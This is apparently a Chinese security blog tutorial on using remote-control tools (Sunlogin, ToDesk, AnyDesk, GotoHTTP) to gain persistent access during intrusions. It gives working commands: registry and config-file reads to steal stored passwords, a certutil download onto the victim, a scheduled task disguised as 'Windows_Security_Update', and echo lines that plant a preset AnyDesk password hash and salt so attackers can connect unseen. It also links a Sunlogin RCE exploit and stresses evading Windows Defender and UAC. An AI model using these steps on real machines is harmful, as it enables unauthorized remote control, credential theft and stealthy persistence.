<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XDiw2sa9ZzhKF_xPex1_Wg)

前言
--

在内网渗透过程中，会碰到远程控制 soft 或者其他，这里针对远程控制软件做如下总结。

远程控制软件
------

### 向日葵篇

#### 向日葵查看版本

#### 向日葵（可以攻击）

针对向日葵的话其实如果有本地安装的话，是有可能存在漏洞的。这里进行复现

```
 向日葵个人版for Windows <= 11.0.0.33
 向日葵简约版 <= V1.0.1.43315（2021.12）
 测试客户端漏洞版本:11.0.0.33162


```

攻击过程：

```
（1）tasklist 查看是否有sunlogin的进程
（2）直接用golang的工具来进行攻击即可

https://github.com/Mr-xn/sunlogin_rce


```

#### 向日葵（不可以攻击）

遇到不可以攻击的向日葵，我们也有几种渗透手法：

##### （1）窃取配置文件来进行解密（低版本 版本号具体未知）

低版本的向日葵把密码和机器码加密写入到了配置文件中，我们可以把配置文件 down 到自己的机器上，然后进行重开向日葵即可。这里向日葵版本较低，就不进行测试

##### （2）在 12.5.2 之前的某些版本可以写到了注册表中，所以可以使用注册表来进行查询

```
reg query HKEY\_USERS\\.DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginInfo  
reg query HKEY\_USERS\\.DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginGreenInfo  


```

```
向日葵默认配置文件路径:  
安装版：C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\config.ini  
便携版：C:\\ProgramData\\Oray\\SunloginClient\\config.ini  
本机验证码参数：encry\_pwd  
本机识别码参数：fastcode(去掉开头字母)  
sunlogincode：判断用户是否登录状态


```

在向日葵高于 12.5.3.* 的机器中已经没有办法获取 secert 了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v67PG8RiaJW0zOJ001aicK4O8neBkuNtmdiaUIHSnYx5pKdByUViaWE6YwE3gwYyEhtvGBxSAUWsrWlKg/640?wx_fmt=png)  

todesk 篇
--------

#### 常见渗透方式（偷配置，百试百灵）

这里还是和前面的向日葵一样，可以进行配置文件的窃取，这里的默认安装路径（C:\Program Files\ToDesk\config.ini）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v67PG8RiaJW0zOJ001aicK4O847t29Hh7Pu8pRF7X6cFXkpE0er6m0SmYnnGJeaEIsL1wwwKddquTiaA/640?wx_fmt=png)

这里咱们可以攻击机安装 todesk，然后读取到 config.ini 中的配置文件，然后和攻击机进行替换即可。这里我虚拟机假装是受害机，读取出来，然后攻击机把 tempauthpassex 进行替换。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v67PG8RiaJW0zOJ001aicK4O8c2xFjpjEBuk6JkevmVVEoDISskStnNGAKYqMxvcS2ap4xK1V3UY5jg/640?wx_fmt=png)

本机下载 todesk 进行替换。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v67PG8RiaJW0zOJ001aicK4O867uuJLm1xkrYkyPuDxHDQRHwrWAA80G6nqxCfV0QiaqxDDZXlBDicoicw/640?wx_fmt=png)

两个机器密码相同（进行替换的时候需要修改攻击机密码更新频率）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v67PG8RiaJW0zOJ001aicK4O8BkiaopV6Q1dwLm5wv6Ko6ayx2YcOjoR8m9uj5fgI7tMBGyJAg0Jg4ibw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v67PG8RiaJW0zOJ001aicK4O85T64KPM74CqEiaK54E7cLc5PlgAm0BZf2LTnKPEic4f9KJDTLuLclsWA/640?wx_fmt=png)

anydesk
-------

```
anydesk的配置文件在 C:\Users\用户名\AppData\Roaming\AnyDesk   文件中


```

而通常这个时候我们有权限修改 anydesk 的配置文件，这里进行测试，起两个虚拟机，设定一个场景（攻击机拿到了 webshell，受害机开着 windows defender，如何去渗透拿到受害机权限）

```
攻击机 ip: 10.211.55.3 + 10.211.55.2
受害机 ip: 10.211.55.4（windows defender全开）


```

#### 情景复现

这里拿到了受害机的 webshell，是个普通权限，无法去关闭

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v67PG8RiaJW0zOJ001aicK4O8ofBoD0QHTXqwVvFnfoWhib33JlM7pG00T0x7beCmyKAUPcSQDX2hoKQ/640?wx_fmt=png)

这里可以看到有 windows defender 来运行，这里无法进行关闭 windows defender，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v67PG8RiaJW0zOJ001aicK4O8vTF8l4UrW0sm1R3yp3gf29AaUEc56Covcb2bicfGhEs9G2P40UYJUhw/640?wx_fmt=png)

这里用 powershell 来执行远程命令下载 anydesk 到用户的目录中去, 因为虚拟机只有 C 盘，所以我创建了一个目录来进行存放，**在真实的渗透过程中，一般是有 RWE 的目录**

```
可以用任意一种方式来放进去，只要放进去就有，这里列举一种方式
这里列举一种（也可以有权限之后，直接拖入上传）
certutil -urlcache -split -f https://download.anydesk.com/AnyDesk.exe C:/tmp/anydesk.exe


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v67PG8RiaJW0zOJ001aicK4O8qpStgXSWA1Ezl17f7cFG5oN6zRGZBCUolGUTRC6yj7HtLJa8SNnxoQ/640?wx_fmt=png)

上传上去之后，先不去打开。转到攻击机进行操作

（1）这里先去给攻击机下载 anydesk（如果下载过的小伙伴，要先清除） C:\Users \ 用户名 \ AppData\Roaming\AnyDesk 中的配置，没有的就不用看这一步，清除结束后如下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v67PG8RiaJW0zOJ001aicK4O867FFcicGAUCKYBbk5dLDI18w9UEPnZGzH0WrrGibfadXrZsFx9mzOrhA/640?wx_fmt=png)

（2）这里打开攻击机的 anydesk，牢记我此处勾选的 id，然后点击右上角的概述 --> 为自主访问设置密码 --> 设置一个密码（这里设置为 Q16G666!!）---> 之后点击应用，攻击机**完全退出** anydesk（小托盘也要退出），并且退出时不选择安装 anydesk

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v67PG8RiaJW0zOJ001aicK4O8yKmulmkJNIz8y7YBicmOlhUiayibXPvqvKnn26Xrib3qPUnrXKBsW0D6icg/640?wx_fmt=png)

（3）攻击机**完全退出** anydesk（小托盘也要退出），这里还是到配置文件下 C:\Users \ 用户名 \ AppData\Roaming\AnyDesk，然后把文件复制下来。是我图中勾选的这四个。复制完成之后，攻击机将文件进行删除。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v67PG8RiaJW0zOJ001aicK4O8A9licOCmTE0DLnDSkw81kJ3fCxxlCj627wztA6IPF8cUdA4anHnGwjA/640?wx_fmt=png)

复制下来之后，给受害机的**当前用户**（拿到权限的用户）找到 anydesk 配置文件路径并且复制到其他（如果没有配置文件路径则进行创建配置文件路径），**一定要注意这里攻击机复制完之后，一定要将攻击机中的配置文件进行删除**

（4）重新打开攻击机，生成配置文件，启动受害机的 anydesk。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v67PG8RiaJW0zOJ001aicK4O81IHnUrOKuO09iaL6aZv13HlOicxhicxwEacOibCP7ALNuFBCQyFTrmLhFw/640?wx_fmt=png)

（5）用攻击机进行连接，这里连接的 id 就是（2）中截图的 id，密码就是（2）中设置的密码即可成功无感绕过 windows defender

#### 情景复现 2 （计划任务）

##### （1）确定用户创建计划任务

如果命令行不能去执行，则可以去创建计划任务去执行，例如，必须先确定当前用户，在当前用户的目录下执行 anydesk，

```
powershell "(((Get-WmiObject -Class Win32_Process -Filter 'Name=\"explorer.exe\"').GetOwner().user) -split '\n')[0]

schtasks /Create /TN Windows_Security_Update /SC monthly /tr "C:\Users\testuser.G1TS\Desktop\anydesk.exe" /RU 用户名

执行计划任务
schtasks /run /tn Windows_Security_Update

后续步骤和上面相同


```

然后添加密码到配置文件中去（密码为 AnyDeskGetAccess）

```
echo ad.anynet.pwd_hash=85352d14ed8d515103f6af88dd68db7573a37ae0f9c9d2952c3a63a8220a501c >> C:\Users\用户目录\AppData\Roaming\AnyDesk\service.conf
echo ad.anynet.pwd_salt=cb65156829a1d5a7281bfe8f6c98734a >> C:\Users\用户目录\AppData\Roaming\AnyDesk\service.conf


```

然后查看用户的 id

```
type C:\Users\用户名\AppData\Roaming\AnyDesk\system.conf


```

连接即可

##### 优点：

整个过程都不需要进行 UAC 弹窗，真正实现了无感绕过

##### 缺点：

（1）会弹出 anydesk 的界面，导致一些问题

（2）启动 anydesk 的权限需要桌面用户权限，比如，IIS 做了中间件环境，拿到的 webshell 一般都是没有桌面用户权限，如果启动 anydesk 是不会成功的。

gotohttp
--------

gotohttp 在我的渗透测试过程中，是一个常见的方式，给我的感觉，即用即连，浏览器连接，方便快捷。但是缺点就是权限划分明确，普通用户权限起的 gotohttp 无法进行管理员权限操作，比如关闭 windows defender 和其他一些行为，不过在规避杀软这儿也有奇效。

#### 复现过程

普通用户上去之后只能用普通用户权限（这里下载对应的 gotohttp _https://gotohttp.com/_），上传上去，命令行运行他，直接在当前目录下生成配置文件，读取配置文件，即可成功连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v67PG8RiaJW0zOJ001aicK4O8IDzTl3b41EvEp21tNLY95tUCQvicLMnjfv5eGhTyMqaNviaJUHNziaYew/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v67PG8RiaJW0zOJ001aicK4O8ibsoF1UO00j2ibIDggFW4ciaoezS3ictG7PF4lwvqN5BT9cxDsvmjJ2sfA/640?wx_fmt=png)

因为是普通用户启动的，这里如果尝试关闭 windows defender，是无法进行点击的。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v67PG8RiaJW0zOJ001aicK4O8qdJhhxLdMEI3icjudkaiafGh6PpiaG6AucKwIMuxRoO7O0dicPsVMK5hkg/640?wx_fmt=png)  

参考
--

```
https://blog.csdn.net/weixin_44216796/article/details/112118108


```

加下方 wx，拉你一起进群学习

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v4xQApknGdLTDr8wRfG76hjlOvMhvZ9LgUtEH9SocyORQ1VCWaJwq6FCh3iaib0TVRPOTRFKB24Wibxw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

官网地址：https://sec.zianstudy.com